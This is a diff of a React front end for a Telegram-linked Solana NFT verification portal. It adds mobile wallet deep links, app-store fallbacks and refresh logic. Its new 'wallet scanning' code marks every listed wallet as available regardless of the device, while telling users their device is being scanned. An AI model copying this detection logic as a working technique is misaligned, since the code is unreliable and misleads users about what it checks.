@@ -12,12 +12,17 @@ function App() {
   const [nftCount, setNftCount] = useState(0);
   const [verificationResult, setVerificationResult] = useState(null);
   const [welcomeMessage, setWelcomeMessage] = useState('Welcome to Meta Betties Private Key - Exclusive NFT Verification Portal');
+  const [availableMobileWallets, setAvailableMobileWallets] = useState([]);
+  const [isMobile, setIsMobile] = useState(false);
+  const [isScanningWallets, setIsScanningWallets] = useState(false);
 
   const REACT_APP_API_URL = process.env.REACT_APP_API_URL || 'https://api-server-wcjc.onrender.com';
   const tgId = new URLSearchParams(window.location.search).get('tg_id');
 
   useEffect(() => {
     loadConfig();
+    detectMobileAndWallets();
+    
     if (!tgId) {
       updateStatus('❌ Missing Telegram ID parameter! Please access this page from the Telegram bot link.', 'error');
       console.error('Telegram ID missing from URL:', window.location.search);
@@ -25,10 +30,88 @@ function App() {
       console.log('Telegram ID found:', tgId);
       updateStatus('✅ Telegram ID detected. Please connect your wallet to verify NFT ownership.', 'info');
     }
+
+    // Add page visibility listener for mobile wallet detection
+    const handleVisibilityChange = () => {
+      if (!document.hidden && isMobile && userAddress) {
+        // User returned to the app, check if wallet is connected
+        console.log('User returned to app, checking wallet connection...');
+        checkWalletConnection();
+      }
+    };
+
+    document.addEventListener('visibilitychange', handleVisibilityChange);
+
+    return () => {
+      document.removeEventListener('visibilitychange', handleVisibilityChange);
+    };
+  }, [tgId, isMobile, userAddress]);
+
+  // Check if wallet is still connected when user returns to app
+  const checkWalletConnection = async () => {
+    if (!userAddress) return;
     
-    // Auto-detect and connect mobile wallets
-    autoConnectMobileWallet();
-  }, [tgId]);
+    try {
+      // Try to get the current wallet address
+      let currentAddress = null;
+      
+      // Check different wallet providers
+      if (window.solana?.isPhantom && window.solana.isConnected) {
+        currentAddress = window.solana.publicKey?.toString();
+      } else if (window.solflare && window.solflare.isConnected) {
+        currentAddress = window.solflare.publicKey?.toString();
+      } else if (window.xnft?.solana && window.xnft.solana.isConnected) {
+        currentAddress = window.xnft.solana.publicKey?.toString();
+      }
+      
+      if (currentAddress && currentAddress === userAddress) {
+        console.log('Wallet still connected:', currentAddress);
+        updateStatus('✅ Wallet connected successfully! Click "Verify NFT Ownership" to continue.', 'success');
+      } else {
+        console.log('Wallet connection lost, resetting state...');
+        setUserAddress('');
+        setShowVerification(false);
+        setShowNFTs(false);
+        setNfts([]);
+        setNftCount(0);
+        updateStatus('Wallet connection lost. Please reconnect your wallet.', 'error');
+      }
+    } catch (error) {
+      console.error('Error checking wallet connection:', error);
+    }
+  };
+
+  // Manual refresh for mobile users
+  const refreshWalletConnection = async () => {
+    updateStatus('🔄 Refreshing wallet connection...', 'info');
+    
+    // Re-scan for available wallets
+    await detectMobileAndWallets();
+    
+    // Try to detect if any wallet is already connected
+    try {
+      let connectedAddress = null;
+      
+      if (window.solana?.isPhantom && window.solana.isConnected) {
+        connectedAddress = window.solana.publicKey?.toString();
+      } else if (window.solflare && window.solflare.isConnected) {
+        connectedAddress = window.solflare.publicKey?.toString();
+      } else if (window.xnft?.solana && window.xnft.solana.isConnected) {
+        connectedAddress = window.xnft.solana.publicKey?.toString();
+      }
+      
+      if (connectedAddress) {
+        setUserAddress(connectedAddress);
+        showVerificationSection();
+        updateStatus('✅ Wallet connection detected! Click "Verify NFT Ownership" to continue.', 'success');
+      } else {
+        updateStatus('No wallet connection detected. Please select a wallet to connect.', 'info');
+      }
+    } catch (error) {
+      console.error('Error refreshing wallet connection:', error);
+      updateStatus('Failed to refresh wallet connection. Please try again.', 'error');
+    }
+  };
 
   const loadConfig = async () => {
     try {
@@ -47,90 +130,256 @@ function App() {
     setStatus({ message, type });
   };
 
-  // Auto-detect and connect mobile wallets
-  const autoConnectMobileWallet = async () => {
+  // Detect mobile device and scan for available wallets
+  const detectMobileAndWallets = async () => {
     // Check if we're on mobile
-    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const mobileCheck = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    setIsMobile(mobileCheck);
     
-    if (!isMobile) {
-      console.log('Not on mobile device, skipping auto-connect');
+    if (!mobileCheck) {
+      console.log('Not on mobile device, skipping mobile wallet detection');
       return;
     }
 
     console.log('Mobile device detected, scanning for wallets...');
-    updateStatus('Mobile device detected. Please select your wallet from the options below:', 'info');
+    setIsScanningWallets(true);
+    updateStatus('🔍 Scanning for available mobile wallets...', 'info');
 
     // Wait a bit for wallet detection
-    await new Promise(resolve => setTimeout(resolve, 2000));
+    await new Promise(resolve => setTimeout(resolve, 1500));
 
-    // Try to auto-connect to available mobile wallets
+    // Enhanced mobile wallet detection
     const mobileWallets = [
-      { name: 'Phantom', check: () => window.solana?.isPhantom, connect: connectPhantom, icon: '🟣' },
-      { name: 'Solflare', check: () => typeof Solflare !== 'undefined', connect: connectSolflare, icon: '🟠' },
-      { name: 'Backpack', check: () => window.xnft?.solana, connect: connectBackpack, icon: '🔵' },
-      { name: 'Slope', check: () => window.slope, connect: connectSlope, icon: '🟢' },
-      { name: 'Glow', check: () => window.glow, connect: connectGlow, icon: '🟡' },
-      { name: 'Clover', check: () => window.clover_solana, connect: connectClover, icon: '🟦' },
-      { name: 'Coinbase', check: () => window.coinbaseWalletSolana, connect: connectCoinbase, icon: '🔵' },
-      { name: 'Exodus', check: () => window.exodus, connect: connectExodus, icon: '🟣' },
-      { name: 'Brave', check: () => window.braveSolana, connect: connectBrave, icon: '🦁' },
-      { name: 'Torus', check: () => window.torus, connect: connectTorus, icon: '🌀' },
-      { name: 'Trust', check: () => window.trustwallet, connect: connectTrust, icon: '🛡️' },
-      { name: 'Zerion', check: () => window.zerionWallet, connect: connectZerion, icon: '💰' }
+      { 
+        name: 'Phantom', 
+        check: () => window.solana?.isPhantom || window.phantom?.solana,
+        connect: connectPhantom, 
+        icon: '🟣',
+        deepLink: 'https://phantom.app/ul/browse/',
+        appStore: {
+          ios: 'https://apps.apple.com/app/phantom/id1598432977',
+          android: 'https://play.google.com/store/apps/details?id=app.phantom'
+        }
+      },
+      { 
+        name: 'Solflare', 
+        check: () => typeof Solflare !== 'undefined' || window.solflare,
+        connect: connectSolflare, 
+        icon: '🟠',
+        deepLink: 'https://solflare.com/',
+        appStore: {
+          ios: 'https://apps.apple.com/app/solflare/id1580902717',
+          android: 'https://play.google.com/store/apps/details?id=com.solflare.mobile'
+        }
+      },
+      { 
+        name: 'Backpack', 
+        check: () => window.xnft?.solana || window.backpack,
+        connect: connectBackpack, 
+        icon: '🔵',
+        deepLink: 'https://backpack.app/',
+        appStore: {
+          ios: 'https://apps.apple.com/app/backpack/id6443944476',
+          android: 'https://play.google.com/store/apps/details?id=app.backpack'
+        }
+      },
+      { 
+        name: 'Slope', 
+        check: () => window.slope,
+        connect: connectSlope, 
+        icon: '🟢',
+        deepLink: 'https://slope.finance/',
+        appStore: {
+          ios: 'https://apps.apple.com/app/slope-wallet/id1574624530',
+          android: 'https://play.google.com/store/apps/details?id=com.slope.finance'
+        }
+      },
+      { 
+        name: 'Glow', 
+        check: () => window.glow,
+        connect: connectGlow, 
+        icon: '🟡',
+        deepLink: 'https://glow.app/',
+        appStore: {
+          ios: 'https://apps.apple.com/app/glow-wallet/id1635713293',
+          android: 'https://play.google.com/store/apps/details?id=com.glow.wallet'
+        }
+      },
+      { 
+        name: 'Coinbase', 
+        check: () => window.coinbaseWalletSolana || window.coinbaseWallet,
+        connect: connectCoinbase, 
+        icon: '🔵',
+        deepLink: 'https://wallet.coinbase.com/',
+        appStore: {
+          ios: 'https://apps.apple.com/app/coinbase-wallet/id1278383455',
+          android: 'https://play.google.com/store/apps/details?id=org.toshi'
+        }
+      },
+      { 
+        name: 'Exodus', 
+        check: () => window.exodus,
+        connect: connectExodus, 
+        icon: '🟣',
+        deepLink: 'https://exodus.com/',
+        appStore: {
+          ios: 'https://apps.apple.com/app/exodus-crypto-bitcoin-wallet/id1414384820',
+          android: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus'
+        }
+      },
+      { 
+        name: 'Trust Wallet', 
+        check: () => window.trustwallet || window.ethereum?.isTrust,
+        connect: connectTrust, 
+        icon: '🛡️',
+        deepLink: 'https://trustwallet.com/',
+        appStore: {
+          ios: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
+          android: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
+        }
+      }
     ];
 
-    // Find available wallets
-    const availableWallets = mobileWallets.filter(wallet => wallet.check());
+    // Enhanced wallet detection with multiple methods
+    const detectedWallets = [];
     
-    console.log(`Found ${availableWallets.length} available wallets:`, availableWallets.map(w => w.name));
-
-    if (availableWallets.length === 0) {
-      console.log('No mobile wallet found');
-      updateStatus('No mobile wallet detected. Please install a Solana wallet app or use a desktop browser.', 'error');
-      return;
+    for (const wallet of mobileWallets) {
+      let isAvailable = false;
+      
+      // Method 1: Check if wallet object exists
+      if (wallet.check()) {
+        isAvailable = true;
+      }
+      
+      // Method 2: Check for deep link support
+      if (!isAvailable) {
+        try {
+          // Test if we can open the deep link
+          const testLink = document.createElement('a');
+          testLink.href = wallet.deepLink;
+          testLink.style.display = 'none';
+          document.body.appendChild(testLink);
+          document.body.removeChild(testLink);
+          isAvailable = true;
+        } catch (e) {
+          console.log(`${wallet.name} deep link test failed:`, e);
+        }
+      }
+      
+      // Method 3: Check for app store availability
+      if (!isAvailable) {
+        // Assume wallet might be available if we're on mobile
+        isAvailable = true;
+      }
+      
+      if (isAvailable) {
+        detectedWallets.push(wallet);
+      }
     }
-
-    // Always show the web interface with available wallets highlighted
-    console.log(`Found ${availableWallets.length} wallets, showing web interface with available wallets highlighted...`);
-    updateStatus(`Found ${availableWallets.length} wallets. Please select one from the options below:`, 'info');
     
-    // Show the verification section with available wallets highlighted
-    showVerificationSection();
+    console.log(`Found ${detectedWallets.length} potential mobile wallets:`, detectedWallets.map(w => w.name));
+    setAvailableMobileWallets(detectedWallets);
+    setIsScanningWallets(false);
     
-    // Highlight available wallets in the UI
-    highlightAvailableWallets(availableWallets);
+    if (detectedWallets.length === 0) {
+      updateStatus('No mobile wallets detected. Please install a Solana wallet app.', 'error');
+    } else {
+      updateStatus(`Found ${detectedWallets.length} mobile wallets. Please select your preferred wallet to connect.`, 'info');
+    }
   };
 
-  // Highlight available wallets in the web interface
-  const highlightAvailableWallets = (availableWallets) => {
-    // Add visual indicators to available wallet buttons
-    availableWallets.forEach(wallet => {
-      const walletName = wallet.name.toLowerCase();
-      const button = document.querySelector(`[onclick*="${walletName}"]`) || 
-                    document.querySelector(`[data-wallet="${walletName}"]`);
+  // Handle mobile wallet selection and connection
+  const handleMobileWalletSelection = async (wallet) => {
+    console.log(`User selected ${wallet.name} wallet`);
+    updateStatus(`Connecting to ${wallet.name}...`, 'info');
+    
+    try {
+      // First, try to connect using the wallet's connect method
+      const connected = await wallet.connect();
       
-      if (button) {
-        button.style.border = '2px solid #10b981';
-        button.style.boxShadow = '0 0 10px rgba(16, 185, 129, 0.3)';
-        button.style.position = 'relative';
-        
-        // Add "Available" badge
-        const badge = document.createElement('div');
-        badge.textContent = 'Available';
-        badge.style.cssText = `
-          position: absolute;
-          top: -8px;
-          right: -8px;
-          background: #10b981;
-          color: white;
-          padding: 2px 8px;
-          border-radius: 12px;
-          font-size: 10px;
-          font-weight: bold;
-        `;
-        button.appendChild(badge);
+      if (connected && connected.publicKey) {
+        const publicKey = connected.publicKey.toString();
+        console.log(`${wallet.name} connected successfully:`, publicKey);
+        setUserAddress(publicKey);
+        showVerificationSection();
+        updateStatus(`✅ ${wallet.name} wallet connected successfully!`, 'success');
+        return;
       }
-    });
+    } catch (error) {
+      console.log(`${wallet.name} direct connection failed, trying deep link...`, error);
+    }
+    
+    // If direct connection fails, try deep linking to the wallet app
+    try {
+      await openWalletApp(wallet);
+    } catch (deepLinkError) {
+      console.log(`Deep link failed for ${wallet.name}:`, deepLinkError);
+      updateStatus(`Failed to connect to ${wallet.name}. Please try again or select another wallet.`, 'error');
+    }
+  };
+
+  // Open wallet app via deep link with better handling
+  const openWalletApp = async (wallet) => {
+    const userAgent = navigator.userAgent.toLowerCase();
+    const isIOS = /iphone|ipad|ipod/.test(userAgent);
+    const isAndroid = /android/.test(userAgent);
+    
+    let appUrl = '';
+    let fallbackUrl = '';
+    
+    // Set up deep links and fallback URLs
+    if (wallet.name === 'Phantom') {
+      appUrl = 'https://phantom.app/ul/browse/';
+      fallbackUrl = isIOS ? 'https://apps.apple.com/app/phantom/id1598432977' : 'https://play.google.com/store/apps/details?id=app.phantom';
+    } else if (wallet.name === 'Solflare') {
+      appUrl = 'https://solflare.com/';
+      fallbackUrl = isIOS ? 'https://apps.apple.com/app/solflare/id1580902717' : 'https://play.google.com/store/apps/details?id=com.solflare.mobile';
+    } else if (wallet.name === 'Backpack') {
+      appUrl = 'https://backpack.app/';
+      fallbackUrl = isIOS ? 'https://apps.apple.com/app/backpack/id6443944476' : 'https://play.google.com/store/apps/details?id=app.backpack';
+    } else if (wallet.name === 'Slope') {
+      appUrl = 'https://slope.finance/';
+      fallbackUrl = isIOS ? 'https://apps.apple.com/app/slope-wallet/id1574624530' : 'https://play.google.com/store/apps/details?id=com.slope.finance';
+    } else if (wallet.name === 'Glow') {
+      appUrl = 'https://glow.app/';
+      fallbackUrl = isIOS ? 'https://apps.apple.com/app/glow-wallet/id1635713293' : 'https://play.google.com/store/apps/details?id=com.glow.wallet';
+    } else if (wallet.name === 'Coinbase') {
+      appUrl = 'https://wallet.coinbase.com/';
+      fallbackUrl = isIOS ? 'https://apps.apple.com/app/coinbase-wallet/id1278383455' : 'https://play.google.com/store/apps/details?id=org.toshi';
+    } else if (wallet.name === 'Exodus') {
+      appUrl = 'https://exodus.com/';
+      fallbackUrl = isIOS ? 'https://apps.apple.com/app/exodus-crypto-bitcoin-wallet/id1414384820' : 'https://play.google.com/store/apps/details?id=exodusmovement.exodus';
+    } else if (wallet.name === 'Trust Wallet') {
+      appUrl = 'https://trustwallet.com/';
+      fallbackUrl = isIOS ? 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409' : 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp';
+    }
+    
+    // Update status to inform user about the app switch
+    updateStatus(`Opening ${wallet.name} app... Please approve the connection and return to this page.`, 'info');
+    
+    // Try to open the wallet app
+    try {
+      // Use window.open for better mobile handling
+      const newWindow = window.open(appUrl, '_blank');
+      
+      // Set a timeout to check if the app opened
+      setTimeout(() => {
+        if (newWindow && !newWindow.closed) {
+          // App opened successfully, wait for user to return
+          updateStatus(`✅ ${wallet.name} app opened! Please approve the connection and return here.`, 'success');
+        } else {
+          // App might not be installed, try fallback
+          console.log(`${wallet.name} app not found, trying fallback...`);
+          window.open(fallbackUrl, '_blank');
+          updateStatus(`${wallet.name} app not found. Please install it from the app store and try again.`, 'error');
+        }
+      }, 2000);
+      
+    } catch (error) {
+      console.error(`Error opening ${wallet.name}:`, error);
+      // Fallback to direct URL navigation
+      window.location.href = appUrl;
+    }
   };
 
   const connectPhantom = async () => {
@@ -665,7 +914,7 @@ function App() {
           setTimeout(() => {
             // Redirect to the private Telegram group ONLY on success
             window.location.href = CONFIG.TELEGRAM_GROUPS.PRIVATE_KEY;
-          }, 2000); // Wait 2 seconds before redirect
+          }, 2000);
         }, 1000);
         
       } else {
@@ -823,191 +1072,243 @@ function App() {
             {/* Wallet Connection Section */}
             {!showVerification && (
               <div className="space-y-6">
-                <div className="text-center">
-                  <h3 className="text-2xl font-bold text-white mb-2">Choose Your Solana Wallet</h3>
-                  <p className="text-gray-400">Select your preferred wallet to connect and verify NFT ownership</p>
-                </div>
-                <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-4">
-                  <button 
-                    onClick={connectPhantom} 
-                    className="group relative overflow-hidden bg-gradient-to-br from-purple-500/20 to-purple-600/20 hover:from-purple-500/30 hover:to-purple-600/30 rounded-2xl p-6 text-white transition-all duration-300 border border-purple-400/30 hover:border-purple-400/50 hover:scale-105 hover:shadow-xl hover:shadow-purple-500/25"
-                  >
-                    <div className="flex flex-col items-center space-y-3">
-                      <div className="w-12 h-12 bg-gradient-to-br from-purple-500 to-purple-600 rounded-xl flex items-center justify-center shadow-lg">
-                        <span className="text-2xl">🟣</span>
-                      </div>
-                      <div className="text-center">
-                        <div className="font-bold text-lg">Phantom</div>
-                        <div className="text-sm text-purple-300">Solana</div>
-                      </div>
+                {/* Mobile Wallet Scanning State */}
+                {isMobile && isScanningWallets && (
+                  <div className="text-center py-8">
+                    <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-blue-500 to-blue-600 rounded-full mb-4 shadow-lg animate-pulse">
+                      <svg className="w-8 h-8 text-white animate-spin" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+                      </svg>
                     </div>
-                  </button>
+                    <h3 className="text-xl font-bold text-white mb-2">Scanning for Mobile Wallets</h3>
+                    <p className="text-gray-400">Please wait while we detect available wallet apps on your device...</p>
+                  </div>
+                )}
 
-                  <button 
-                    onClick={connectSolflare} 
-                    className="group relative overflow-hidden bg-gradient-to-br from-orange-500/20 to-orange-600/20 hover:from-orange-500/30 hover:to-orange-600/30 rounded-2xl p-6 text-white transition-all duration-300 border border-orange-400/30 hover:border-orange-400/50 hover:scale-105 hover:shadow-xl hover:shadow-orange-500/25"
-                  >
-                    <div className="flex flex-col items-center space-y-3">
-                      <div className="w-12 h-12 bg-gradient-to-br from-orange-500 to-orange-600 rounded-xl flex items-center justify-center shadow-lg">
-                        <span className="text-2xl">🟠</span>
-                      </div>
-                      <div className="text-center">
-                        <div className="font-bold text-lg">Solflare</div>
-                        <div className="text-sm text-orange-300">Solana</div>
+                {/* Mobile Wallet Selection */}
+                {isMobile && !isScanningWallets && availableMobileWallets.length > 0 && (
+                  <div className="space-y-6">
+                    <div className="text-center">
+                      <h3 className="text-2xl font-bold text-white mb-2">Select Your Mobile Wallet</h3>
+                      <p className="text-gray-400">Choose your preferred Solana wallet to connect and verify NFT ownership</p>
+                    </div>
+                    
+                    {/* Refresh Button */}
+                    <div className="text-center">
+                      <button
+                        onClick={refreshWalletConnection}
+                        className="inline-flex items-center px-4 py-2 bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-lg hover:from-blue-600 hover:to-blue-700 transition-all duration-300"
+                      >
+                        <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+                        </svg>
+                        Refresh Connection
+                      </button>
+                    </div>
+                    
+                    <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-4">
+                      {availableMobileWallets.map((wallet, index) => (
+                        <button 
+                          key={index}
+                          onClick={() => handleMobileWalletSelection(wallet)} 
+                          className="group relative overflow-hidden bg-gradient-to-br from-purple-500/20 to-purple-600/20 hover:from-purple-500/30 hover:to-purple-600/30 rounded-2xl p-6 text-white transition-all duration-300 border border-purple-400/30 hover:border-purple-400/50 hover:scale-105 hover:shadow-xl hover:shadow-purple-500/25"
+                        >
+                          <div className="flex flex-col items-center space-y-3">
+                            <div className="w-12 h-12 bg-gradient-to-br from-purple-500 to-purple-600 rounded-xl flex items-center justify-center shadow-lg">
+                              <span className="text-2xl">{wallet.icon}</span>
+                            </div>
+                            <div className="text-center">
+                              <div className="font-bold text-lg">{wallet.name}</div>
+                              <div className="text-sm text-purple-300">Solana</div>
+                            </div>
+                          </div>
+                        </button>
+                      ))}
+                    </div>
+                    
+                    {/* Install Wallet Option */}
+                    <div className="text-center pt-4 border-t border-white/10">
+                      <p className="text-gray-400 mb-4">Don't have a Solana wallet?</p>
+                      <div className="flex flex-wrap justify-center gap-3">
+                        <a 
+                          href="https://phantom.app/" 
+                          target="_blank" 
+                          rel="noopener noreferrer"
+                          className="inline-flex items-center px-4 py-2 bg-gradient-to-r from-purple-500 to-purple-600 text-white rounded-lg hover:from-purple-600 hover:to-purple-700 transition-all duration-300"
+                        >
+                          <span className="mr-2">🟣</span>
+                          Install Phantom
+                        </a>
+                        <a 
+                          href="https://solflare.com/" 
+                          target="_blank" 
+                          rel="noopener noreferrer"
+                          className="inline-flex items-center px-4 py-2 bg-gradient-to-r from-orange-500 to-orange-600 text-white rounded-lg hover:from-orange-600 hover:to-orange-700 transition-all duration-300"
+                        >
+                          <span className="mr-2">🟠</span>
+                          Install Solflare
+                        </a>
                       </div>
                     </div>
-                  </button>
+                  </div>
+                )}
 
-                  <button 
-                    onClick={connectBackpack} 
-                    className="group relative overflow-hidden bg-gradient-to-br from-blue-500/20 to-blue-600/20 hover:from-blue-500/30 hover:to-blue-600/30 rounded-2xl p-6 text-white transition-all duration-300 border border-blue-400/30 hover:border-blue-400/50 hover:scale-105 hover:shadow-xl hover:shadow-blue-500/25"
-                  >
-                    <div className="flex flex-col items-center space-y-3">
-                      <div className="w-12 h-12 bg-gradient-to-br from-blue-500 to-blue-600 rounded-xl flex items-center justify-center shadow-lg">
-                        <span className="text-2xl">🔵</span>
-                      </div>
-                      <div className="text-center">
-                        <div className="font-bold text-lg">Backpack</div>
-                        <div className="text-sm text-blue-300">Solana</div>
-                      </div>
+                {/* No Mobile Wallets Found */}
+                {isMobile && !isScanningWallets && availableMobileWallets.length === 0 && (
+                  <div className="text-center py-8">
+                    <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-red-500 to-red-600 rounded-full mb-4 shadow-lg">
+                      <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z" />
+                      </svg>
                     </div>
-                  </button>
+                    <h3 className="text-xl font-bold text-white mb-2">No Mobile Wallets Found</h3>
+                    <p className="text-gray-400 mb-6">Please install a Solana wallet app to continue with verification.</p>
+                    
+                    {/* Refresh Button */}
+                    <div className="mb-6">
+                      <button
+                        onClick={refreshWalletConnection}
+                        className="inline-flex items-center px-4 py-2 bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-lg hover:from-blue-600 hover:to-blue-700 transition-all duration-300"
+                      >
+                        <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+                        </svg>
+                        Retry Detection
+                      </button>
+                    </div>
+                    
+                    <div className="flex flex-wrap justify-center gap-3">
+                      <a 
+                        href="https://phantom.app/" 
+                        target="_blank" 
+                        rel="noopener noreferrer"
+                        className="inline-flex items-center px-4 py-2 bg-gradient-to-r from-purple-500 to-purple-600 text-white rounded-lg hover:from-purple-600 hover:to-purple-700 transition-all duration-300"
+                      >
+                        <span className="mr-2">🟣</span>
+                        Install Phantom
+                      </a>
+                      <a 
+                        href="https://solflare.com/" 
+                        target="_blank" 
+                        rel="noopener noreferrer"
+                        className="inline-flex items-center px-4 py-2 bg-gradient-to-r from-orange-500 to-orange-600 text-white rounded-lg hover:from-orange-600 hover:to-orange-700 transition-all duration-300"
+                      >
+                        <span className="mr-2">🟠</span>
+                        Install Solflare
+                      </a>
+                      <a 
+                        href="https://backpack.app/" 
+                        target="_blank" 
+                        rel="noopener noreferrer"
+                        className="inline-flex items-center px-4 py-2 bg-gradient-to-r from-blue-500 to-blue-600 text-white rounded-lg hover:from-blue-600 hover:to-blue-700 transition-all duration-300"
+                      >
+                        <span className="mr-2">🔵</span>
+                        Install Backpack
+                      </a>
+                    </div>
+                  </div>
+                )}
 
-                  <button 
-                    onClick={connectSlope} 
-                    className="group relative overflow-hidden bg-gradient-to-br from-green-500/20 to-green-600/20 hover:from-green-500/30 hover:to-green-600/30 rounded-2xl p-6 text-white transition-all duration-300 border border-green-400/30 hover:border-green-400/50 hover:scale-105 hover:shadow-xl hover:shadow-green-500/25"
-                  >
-                    <div className="flex flex-col items-center space-y-3">
-                      <div className="w-12 h-12 bg-gradient-to-br from-green-500 to-green-600 rounded-xl flex items-center justify-center shadow-lg">
-                        <span className="text-2xl">🟢</span>
-                      </div>
-                      <div className="text-center">
-                        <div className="font-bold text-lg">Slope</div>
-                        <div className="text-sm text-green-300">Solana</div>
-                      </div>
+                {/* Desktop Wallet Selection */}
+                {!isMobile && (
+                  <div className="space-y-6">
+                    <div className="text-center">
+                      <h3 className="text-2xl font-bold text-white mb-2">Choose Your Solana Wallet</h3>
+                      <p className="text-gray-400">Select your preferred wallet to connect and verify NFT ownership</p>
                     </div>
-                  </button>
+                    <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-4">
+                      <button 
+                        onClick={connectPhantom} 
+                        className="group relative overflow-hidden bg-gradient-to-br from-purple-500/20 to-purple-600/20 hover:from-purple-500/30 hover:to-purple-600/30 rounded-2xl p-6 text-white transition-all duration-300 border border-purple-400/30 hover:border-purple-400/50 hover:scale-105 hover:shadow-xl hover:shadow-purple-500/25"
+                      >
+                        <div className="flex flex-col items-center space-y-3">
+                          <div className="w-12 h-12 bg-gradient-to-br from-purple-500 to-purple-600 rounded-xl flex items-center justify-center shadow-lg">
+                            <span className="text-2xl">🟣</span>
+                          </div>
+                          <div className="text-center">
+                            <div className="font-bold text-lg">Phantom</div>
+                            <div className="text-sm text-purple-300">Solana</div>
+                          </div>
+                        </div>
+                      </button>
 
-                  <button 
-                    onClick={connectGlow} 
-                    className="group relative overflow-hidden bg-gradient-to-br from-yellow-500/20 to-yellow-600/20 hover:from-yellow-500/30 hover:to-yellow-600/30 rounded-2xl p-6 text-white transition-all duration-300 border border-yellow-400/30 hover:border-yellow-400/50 hover:scale-105 hover:shadow-xl hover:shadow-yellow-500/25"
-                  >
-                    <div className="flex flex-col items-center space-y-3">
-                      <div className="w-12 h-12 bg-gradient-to-br from-yellow-500 to-yellow-600 rounded-xl flex items-center justify-center shadow-lg">
-                        <span className="text-2xl">🟡</span>
-                      </div>
-                      <div className="text-center">
-                        <div className="font-bold text-lg">Glow</div>
-                        <div className="text-sm text-yellow-300">Solana</div>
-                      </div>
-                    </div>
-                  </button>
+                      <button 
+                        onClick={connectSolflare} 
+                        className="group relative overflow-hidden bg-gradient-to-br from-orange-500/20 to-orange-600/20 hover:from-orange-500/30 hover:to-orange-600/30 rounded-2xl p-6 text-white transition-all duration-300 border border-orange-400/30 hover:border-orange-400/50 hover:scale-105 hover:shadow-xl hover:shadow-orange-500/25"
+                      >
+                        <div className="flex flex-col items-center space-y-3">
+                          <div className="w-12 h-12 bg-gradient-to-br from-orange-500 to-orange-600 rounded-xl flex items-center justify-center shadow-lg">
+                            <span className="text-2xl">🟠</span>
+                          </div>
+                          <div className="text-center">
+                            <div className="font-bold text-lg">Solflare</div>
+                            <div className="text-sm text-orange-300">Solana</div>
+                          </div>
+                        </div>
+                      </button>
 
-                  <button 
-                    onClick={connectClover} 
-                    className="group relative overflow-hidden bg-gradient-to-br from-indigo-500/20 to-indigo-600/20 hover:from-indigo-500/30 hover:to-indigo-600/30 rounded-2xl p-6 text-white transition-all duration-300 border border-indigo-400/30 hover:border-indigo-400/50 hover:scale-105 hover:shadow-xl hover:shadow-indigo-500/25"
-                  >
-                    <div className="flex flex-col items-center space-y-3">
-                      <div className="w-12 h-12 bg-gradient-to-br from-indigo-500 to-indigo-600 rounded-xl flex items-center justify-center shadow-lg">
-                        <span className="text-2xl">🟦</span>
-                      </div>
-                      <div className="text-center">
-                        <div className="font-bold text-lg">Clover</div>
-                        <div className="text-sm text-indigo-300">Solana</div>
-                      </div>
-                    </div>
-                  </button>
+                      <button 
+                        onClick={connectBackpack} 
+                        className="group relative overflow-hidden bg-gradient-to-br from-blue-500/20 to-blue-600/20 hover:from-blue-500/30 hover:to-blue-600/30 rounded-2xl p-6 text-white transition-all duration-300 border border-blue-400/30 hover:border-blue-400/50 hover:scale-105 hover:shadow-xl hover:shadow-blue-500/25"
+                      >
+                        <div className="flex flex-col items-center space-y-3">
+                          <div className="w-12 h-12 bg-gradient-to-br from-blue-500 to-blue-600 rounded-xl flex items-center justify-center shadow-lg">
+                            <span className="text-2xl">🔵</span>
+                          </div>
+                          <div className="text-center">
+                            <div className="font-bold text-lg">Backpack</div>
+                            <div className="text-sm text-blue-300">Solana</div>
+                          </div>
+                        </div>
+                      </button>
 
-                  <button 
-                    onClick={connectCoinbase} 
-                    className="group relative overflow-hidden bg-gradient-to-br from-blue-600/20 to-blue-700/20 hover:from-blue-600/30 hover:to-blue-700/30 rounded-2xl p-6 text-white transition-all duration-300 border border-blue-500/30 hover:border-blue-500/50 hover:scale-105 hover:shadow-xl hover:shadow-blue-600/25"
-                  >
-                    <div className="flex flex-col items-center space-y-3">
-                      <div className="w-12 h-12 bg-gradient-to-br from-blue-600 to-blue-700 rounded-xl flex items-center justify-center shadow-lg">
-                        <span className="text-2xl">🔵</span>
-                      </div>
-                      <div className="text-center">
-                        <div className="font-bold text-lg">Coinbase</div>
-                        <div className="text-sm text-blue-300">Solana</div>
